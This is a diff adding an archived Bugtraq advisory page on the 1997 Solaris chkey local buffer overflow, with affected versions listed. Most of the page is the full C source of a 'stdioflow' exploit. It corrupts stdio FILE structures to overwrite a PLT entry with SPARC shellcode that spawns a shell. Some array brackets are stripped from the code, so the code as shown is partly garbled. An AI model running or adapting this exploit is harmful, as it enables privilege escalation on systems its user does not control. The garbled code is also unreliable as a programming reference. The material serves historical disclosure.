@@ -1,0 +1,122 @@
+#SpeeDr00t@Black Falcon<br>#bid207<p><b><span style="font-size: 18pt;">Solaris chkey Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/207/info">info</a><br><a href="http://www.securityfocus.com/bid/207/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/207/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/207/solution">solution</a><br><a href="http://www.securityfocus.com/bid/207/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				207
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 19 1997 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 19 1997 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This bug was originally posted to the Bugtraq mailing list by Adam Morrison (adam@MATH.TAU.AC.IL)
+on Mon, 19 May 1997.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Sun Solaris 2.5.1 _x86<br/>
+					
+				
+					Sun Solaris 2.5.1 <br/>
+					
+				
+					Sun Solaris  2.5_x86<br/>
+					
+				
+					Sun Solaris  2.5<br/>
+					
+				
+					Sun Solaris  2.4_x86<br/>
+					
+				
+					Sun Solaris  2.4<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Sun Solaris  7.0_x86<br/>
+					
+				
+					Sun Solaris  7.0<br/>
+					
+				
+					Sun Solaris  2.6_x86<br/>
+					
+				
+					Sun Solaris  2.6<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	/*<br/> * stdioflow -- exploit for data overrun conditions<br/> * adam@math.tau.ac.il (Adam Morrison)<br/> *<br/> * This program causes programs which use stdio(3S) and have data buffer<br/> * overflow conditions to overwrite stdio's iob array of FILE structures<br/> * with malicious, buffered FILEs.  Thus it is possible to get stdio to<br/> * overwrite arbitrary places in memory; specifically, it overwrites a<br/> * specific procedure linkage table entry with SPARC assembly code to<br/> * execute a shell.<br/> *<br/> * Using this program involves several steps.<br/> *<br/> * First, find a code path which leads to the use of stdout or stderr after<br/> * the buffer has been overwritten.  The default case being<br/> *<br/> *      strcpy(buffer, argv0);<br/> *      / we gave it wrong arguments /<br/> *      fprintf(stderr, "usage: %s ...\n", buffer);<br/> *      exit(1);<br/> *<br/> * In this case you need to overwrite exit()'s PLT entry.<br/> *<br/> * Second, find out the address that the library that contains the PLT<br/> * you want to overwrite (in this case, it would be libc) gets mmapped()<br/> * to in the process' address space.  You need it to calculate the<br/> * absolute of the PLT entry.  (Doing this is left as an, uh, exercise<br/> * to the reader.)<br/> *<br/> * Finally, calculate the offset to take from the PLT entry -- you don't<br/> * want ``usage: '' in the table, but the instructions in ``%s''.  In this<br/> * case, it would be 7.<br/> *<br/> * Then run it.<br/> */<br/>#include &lt;stdio.h&gt;<br/>#include &lt;fcntl.h&gt;<br/>#include &lt;string.h&gt;<br/>#include &lt;libelf.h&gt;<br/><br/>#include &lt;sys/types.h&gt;<br/>#include &lt;sys/link.h&gt;<br/><br/>#define PLT_SYMBOL "_PROCEDURE_LINKAGE_TABLE_"<br/><br/>u_int shellcode = {<br/>  0x821020ca,<br/>  0xa61cc013,<br/>  0x900cc013,<br/>  0x920cc013,<br/>  0xa604e001,<br/>  0x91d02008,<br/>  0x2d0bd89a,<br/>  0xac15a16e,<br/>  0x2f0bdcda,<br/>  0x900b800e,<br/>  0x9203a008,<br/>  0x941a800a,<br/>  0x9c03a010,<br/>  0xec3bbff0,<br/>  0xdc23bff8,<br/>  0xc023bffc,<br/>  0x8210203b,<br/>  0x91d02008,<br/>};<br/>int shell_len = sizeof (shellcode) / sizeof (u_long);<br/>u_long meow = 0x6d656f77;<br/>char *prog;<br/><br/>void elferr(void);<br/>u_long symval(char *, char *);<br/>u_long plt_offset(char *, char *);<br/><br/>void<br/>usage()<br/>{<br/>        fprintf(stderr, "usage: %s options buf(name or @address) libaddr program args\n", prog);<br/>        fprintf(stderr, "options: -l library -f function -o offset -e env\n");<br/>        exit(1);<br/>}<br/><br/>main(int argc, char **argv)<br/>{<br/>        char *env = NULL;<br/>        char *library = "/usr/lib/libc.so";<br/>        char *function = "_exithandle";<br/>        u_long off, uoff = 0;<br/>        u_long libaddr, pltaddr, bufaddr, iobaddr;<br/>        u_long pltent;<br/>        char *prognam, *bufnam;<br/>        int buflen;<br/>        char *badbuf;<br/>        u_long *bp;<br/>        int c;<br/>        extern char *optarg;<br/>        extern int optind;<br/>        char **arg0, **arg;<br/><br/>        prog = strrchr(argv0, '/');<br/>        if (prog)<br/>          ++prog;<br/>        else<br/>          prog = argv0;<br/><br/>        while ((c = getopt(argc, argv, "l:f:o:e:")) != EOF)<br/>          switch (c) {<br/>          case 'l':<br/>            library = optarg;<br/>            break;<br/>          case 'f':<br/>            function = optarg;<br/>            break;<br/>          case 'o':<br/>            uoff = strtol(optarg, (char **)0, 0);<br/>            break;<br/>          case 'e':<br/>            env = optarg;<br/>            break;<br/>          default:<br/>            usage();<br/>          }<br/><br/>        if (argc - optind &lt; 3)<br/>          usage();<br/><br/>        bufnam = argvoptind;<br/><br/>        /*<br/>         * This is the address that the library in which `function'<br/>         * lives gets mapped to in the child address space.  We could force<br/>         * a non-privileged copy of `prognam' to dump core, and fish<br/>         * out the memory mappings from the resulting core file; but this<br/>         * is really something users should be able to do themselves.<br/>         */<br/>        libaddr = strtoul(argvoptind+1, (char **)0, 0);<br/>        if (libaddr == 0) {<br/>          fprintf(stderr, "%s: impossible library virtual address: %s\n",<br/>                  prog, argvoptind+1);<br/>          exit(1);<br/>        }<br/>        printf("Using library %s at 0x%p\n", library, libaddr);<br/><br/>        prognam = argvoptind+2;<br/><br/>        arg0 = &amp;argvoptind+3;<br/><br/>        /*<br/>         * `pltaddr' is the offset at which the library's PLT will be<br/>         * at from `libaddr'.<br/>         */<br/>        pltaddr = symval(library, PLT_SYMBOL);<br/>        if (pltaddr == 0) {<br/>          fprintf(stderr, "%s: could not find PLT offset from library\n",<br/>                  prog);<br/>          exit(1);<br/>        }<br/>        printf("Using PLT at 0x%p\n", pltaddr);<br/><br/>        /*<br/>         * `off' is the offset from `pltaddr' in which the desired<br/>         * function's PLT entry is.<br/>         */<br/>        off = plt_offset(library, function);<br/>        if (off == 0) {<br/>          fprintf(stderr, "%s: impossible offset from PLT returned\n", prog);<br/>          exit(1);<br/>        }<br/>        printf("Found %s at 0x%p\n", function, off);<br/><br/>        /*<br/>         * `bufaddr' is the name (or address) of the buffer we want to<br/>         * overflow.  It's not a stack buffer, so finding it out is trivial.<br/>         */<br/>        if (bufnam0 == '@')<br/>          bufaddr = strtol(&amp;bufnam1, (char **)0, 0);<br/>        else<br/>          bufaddr = symval(prognam, bufnam);<br/><br/>        if (bufaddr == 0) {<br/>          fprintf(stderr, "%s: illegal buffer address: %s\n", prog, prognam);<br/>          exit(1);<br/>        }<br/>        printf("Buffer at 0x%p\n", bufaddr);<br/><br/>        /*<br/>         * `iobaddr' is obviously the address of the stdio(3) array.<br/>         */<br/>        iobaddr = symval(prognam, "__iob");<br/>        if (iobaddr == 0) {<br/>          fprintf(stderr, "%s: could not find iob in %s\n", prog, prognam);<br/>          exit(1);<br/>        }<br/>        printf("iob at 0x%p\n", iobaddr);<br/><br/>        /*<br/>         * This is the absolute address of the PLT entry we want to<br/>         * overwrite.<br/>         */<br/>        pltent = libaddr + pltaddr + off;<br/><br/>        buflen = iobaddr - bufaddr;<br/>        if (buflen &lt; shell_len) {<br/>          fprintf(stderr, "%s: not enough space for shell code\n", prog);<br/>          exit(1);<br/>        }<br/>        if (env) {<br/>          buflen += strlen(env) + 5;<br/>          if (buflen &amp; 3) {<br/>            fprintf(stderr, "%s: alignment problem\n", prog);<br/>            exit(1);<br/>          }<br/>        }<br/>        badbuf = (char *)malloc(buflen);<br/>        if (badbuf == 0) {<br/>          fprintf(stderr, "%s: out of memory\n", prog);<br/>          exit(1);<br/>        }<br/><br/>        if (env) {<br/>          buflen -= (strlen(env) + 5);<br/>          sprintf(badbuf, "%s=", env);<br/><br/>          bp = (u_long *)&amp;badbufstrlen(badbuf);<br/>        } else<br/>          bp = (u_long *)badbuf;<br/><br/>        buflen /= sizeof (*bp);<br/>        for (c = 0; c &lt; shell_len; c++)<br/>          *bp++ = shellcodec;<br/><br/>        for (; c &lt; buflen; c++)<br/>          *bp++ = meow;<br/><br/>        /*<br/>         * stdin -- whatever<br/>         */<br/>        *bp++ = -29;<br/>        *bp++ = 0xef7d7310;<br/>        *bp++ = 0xef7d7310 - 29;<br/>        *bp++ = 0x0101ffff;<br/><br/>        /*<br/>         * stdout<br/>         */<br/>        *bp++ = -29;<br/>        *bp++ = pltent - uoff;<br/>        *bp++ = pltent - 29;<br/>        *bp++ = 0x0201ffff;<br/><br/>        /*<br/>         * stderr<br/>         */<br/>        *bp++ = -29;<br/>        *bp++ = pltent - uoff;<br/>        *bp++ = pltent - 29;<br/>        *bp++ = 0x0202ffff;<br/><br/>        *bp++ = 0;<br/><br/>        printf("Using absolute address 0x%p\n", pltent - uoff);<br/><br/>        /*<br/>         * Almost ready to do the exec()<br/>         */<br/>        if (env)<br/>          putenv(badbuf);<br/>        else<br/>          for (arg = arg0; arg &amp;&amp; *arg; arg++) {<br/>            if (strcmp(*arg, "%s") == 0)<br/>              *arg = badbuf;<br/>          }<br/><br/>        printf("Using %d bytes\n", buflen*4);<br/><br/>        if (execv(prognam, arg0) &lt; 0) {<br/>          perror("execv");<br/>          exit(1);<br/>        }<br/><br/>}<br/><br/>u_long<br/>symval(char *lib, char *name)<br/>{<br/>        int fd;<br/>        int i, nsym;<br/>        u_long addr = 0;<br/>        Elf32_Shdr *shdr;<br/>        Elf *elf;<br/>        Elf_Scn *scn = (Elf_Scn *)0;<br/>        Elf32_Ehdr *ehdr;<br/>        Elf_Data *dp;<br/>        Elf32_Sym *symbol;<br/>        char *np;<br/><br/>        fd = open(lib, O_RDONLY);<br/>        if (fd &lt; 0) {<br/>          perror("open");<br/>          exit(1);<br/>        }<br/><br/>        /* Initializations, see elf(3E) */<br/>        (void) elf_version(EV_CURRENT);<br/>        elf = elf_begin(fd, ELF_C_READ, 0);<br/>        if (elf == (Elf *)0)<br/>          elferr();<br/><br/>        ehdr = elf32_getehdr(elf);<br/>        if (ehdr == (Elf32_Ehdr*)0)<br/>          elferr();<br/><br/>        /*<br/>         * Loop through sections looking for the dynamic symbol table.<br/>         */<br/>        while ((scn = elf_nextscn(elf, scn))) {<br/><br/>          shdr = elf32_getshdr(scn);<br/>          if (shdr == (Elf32_Shdr *)0)<br/>            elferr();<br/><br/>          if (shdr-&gt;sh_type == SHT_DYNSYM)<br/>              break;<br/>        }<br/><br/>        if (scn == (Elf_Scn *)0) {<br/>          fprintf(stderr, "%s: dynamic symbol table not found\n", prog);<br/>          exit(1);<br/>        }<br/><br/>        dp = elf_getdata(scn, (Elf_Data *)0);<br/>        if (dp == (Elf_Data *)0)<br/>          elferr();<br/><br/>        if (dp-&gt;d_size == 0) {<br/>          fprintf(stderr, "%s: .dynamic symbol table empty\n", prog);<br/>          exit(1);<br/>        }<br/><br/>        symbol = (Elf32_Sym *)dp-&gt;d_buf;<br/>        nsym = dp-&gt;d_size / sizeof (*symbol);<br/><br/>        for (i = 0; i &lt; nsym; i++) {<br/>          np = elf_strptr(elf, shdr-&gt;sh_link, (size_t)<br/>                          symboli.st_name);<br/>          if (np &amp;&amp; !strcmp(np, name))<br/>            break;<br/><br/>        }<br/><br/>        if (i &lt; nsym)<br/>          addr = symboli.st_value;<br/><br/>        (void) elf_end(elf);<br/>        (void) close(fd);<br/><br/>        return (addr);<br/>}<br/><br/>u_long<br/>plt_offset(char *lib, char *func)<br/>{<br/>        int fd;<br/>        Elf *elf;<br/>        Elf_Scn *scn = (Elf_Scn *)0;<br/>        Elf_Data *dp;<br/>        Elf32_Ehdr *ehdr;<br/>        Elf32_Rela *relocp = (Elf32_Rela *)0;<br/>        Elf32_Word pltsz = 0;<br/>        Elf32_Shdr *shdr;<br/>        Elf_Scn *symtab;<br/>        Elf32_Sym *symbols;<br/>        char *np;<br/>        u_long offset = 0;<br/>        u_long plt;<br/><br/>        fd = open(lib, O_RDONLY);<br/>        if (fd &lt; 0) {<br/>          perror("open");<br/>          exit(1);<br/>        }<br/><br/>        /* Initializations, see elf(3E) */<br/>        (void) elf_version(EV_CURRENT);<br/>        elf = elf_begin(fd, ELF_C_READ, 0);<br/>        if (elf == (Elf *)0)<br/>          elferr();<br/><br/>        ehdr = elf32_getehdr(elf);<br/>        if (ehdr == (Elf32_Ehdr *)0)<br/>          elferr();<br/><br/>        /*<br/>         * Loop through sections looking for the relocation entries<br/>         * associated with the procedure linkage table.<br/>         */<br/>        while ((scn = elf_nextscn(elf, scn))) {<br/><br/>          shdr = elf32_getshdr(scn);<br/>          if (shdr == (Elf32_Shdr *)0)<br/>            elferr();<br/><br/>          if (shdr-&gt;sh_type == SHT_RELA) {<br/>            np = elf_strptr(elf, ehdr-&gt;e_shstrndx, (size_t) shdr-&gt;sh_name);<br/>            if (np &amp;&amp; !strcmp(np, ".rela.plt"))<br/>              break;<br/>          }<br/><br/>        }<br/><br/>        if (scn == (Elf_Scn *)0) {<br/>          fprintf(stderr, "%s: .rela.plt section not found\n", prog);<br/>          exit(1);<br/>        }<br/><br/>        dp = elf_getdata(scn, (Elf_Data *)0);<br/>        if (dp == (Elf_Data *)0)<br/>          elferr();<br/><br/>        if (dp-&gt;d_size == 0) {<br/>          fprintf(stderr, "%s: .rela.plt section empty\n", prog);<br/>          exit(1);<br/>        }<br/><br/>        /*<br/>         * The .rela.plt section contains an array of relocation entries,<br/>         * the first 4 are not used.<br/>         */<br/>        relocp = (Elf32_Rela *)dp-&gt;d_buf;<br/>        pltsz = dp-&gt;d_size / sizeof (*relocp);<br/><br/>        relocp += 4;<br/>        pltsz -= 4;<br/><br/>        /*<br/>         * Find the symbol table associated with this section.<br/>         */<br/>        symtab = elf_getscn(elf, shdr-&gt;sh_link);<br/>        if (symtab == (Elf_Scn *)0)<br/>          elferr();<br/><br/>        shdr = elf32_getshdr(symtab);<br/>        if (shdr == (Elf32_Shdr *)0)<br/>          elferr();<br/><br/>        dp = elf_getdata(symtab, (Elf_Data *)0);<br/>        if (dp == (Elf_Data *)0)<br/>          elferr();<br/><br/>        if (dp-&gt;d_size == 0) {<br/>          fprintf(stderr, "%s: dynamic symbol table empty\n", prog);<br/>          exit(1);<br/>        }<br/><br/>        symbols = (Elf32_Sym *)dp-&gt;d_buf;<br/><br/>        /*<br/>         * Loop through the relocation list, looking for the desired<br/>         * symbol.<br/>         */<br/>        while (pltsz-- &gt; 0) {<br/>          Elf32_Word ndx = ELF32_R_SYM(relocp-&gt;r_info);<br/><br/>          np = elf_strptr(elf, shdr-&gt;sh_link, (size_t)<br/>                          symbolsndx.st_name);<br/>          if (np &amp;&amp; !strcmp(np, func))<br/>            break;<br/><br/>          relocp++;<br/>        }<br/><br/>        if (relocp) {<br/>          plt = symval(lib, PLT_SYMBOL);<br/>          offset = relocp-&gt;r_offset - plt;<br/>        }<br/><br/>        (void) elf_end(elf);<br/>        (void) close(fd);<br/><br/>        return (offset);<br/>}<br/><br/>void<br/>elferr()<br/>{<br/>        fprintf(stderr, "%s: %s\n", prog, elf_errmsg(elf_errno()));<br/><br/>        exit(1);<br/>}
+	
+		<ul>
+</ul>
+</div>
